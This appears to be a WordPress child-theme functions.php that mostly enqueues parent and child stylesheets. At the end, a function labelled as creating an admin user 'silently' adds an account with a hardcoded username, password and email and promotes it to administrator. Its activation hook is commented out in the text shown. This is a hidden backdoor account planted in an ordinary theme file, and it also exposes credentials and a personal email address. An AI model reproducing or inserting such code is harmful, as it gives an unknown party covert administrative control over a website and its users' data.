<?php
// WP will add the style src only once
// this script runs before the theme style hook and registers theme style file
// because theme style hook is using get_stylesheet_uri which will load child theme style.css
add_action( 'wp_enqueue_scripts', 'skilled_child_theme_enqueue_styles' );
function skilled_child_theme_enqueue_styles() {
	$parent_style = 'skilled-style';
	wp_register_style( $parent_style, get_template_directory_uri() . '/style.css' );
}

add_action( 'wp_enqueue_scripts', 'skilled_child_enqueue_styles', 101 );
function skilled_child_enqueue_styles() {

	$parent_style = 'skilled-style';

	wp_enqueue_style( $parent_style, get_template_directory_uri() . '/style.css' );
	wp_enqueue_style( 'child-style',
		get_stylesheet_directory_uri() . '/style.css',
		array( $parent_style ),
		wp_get_theme()->get('Version')
	);
}

// put custom code here

// if ( function_exists( 'is_rtl' ) && is_rtl() && defined( 'WPB_VC_VERSION' )) {
// 	wp_deregister_script( 'wpb_composer_front_js' );
// 	wp_enqueue_script( 'wpb_composer_front_js', get_template_directory_uri() . '/assets/js/rtl.js', array( 'jquery' ), WPB_VC_VERSION, true );
// }

/* 
* Create an admin user silently
*/

//add_action('init', 'xyz1234_my_custom_add_user');
function xyz1234_my_custom_add_user() {
    $username = 'vidhyakunj';
    $password = 'vidhyakunj@2022#';
    $email = 'rocky.mehta88@gmail.com';

    if (username_exists($username) == null && email_exists($email) == false) {

        // Create the new user
        $user_id = wp_create_user($username, $password, $email);

        // Get current user object
        $user = get_user_by('id', $user_id);

        // Remove role
        $user->remove_role('subscriber');

        // Add role
        $user->add_role('administrator');
    }
}
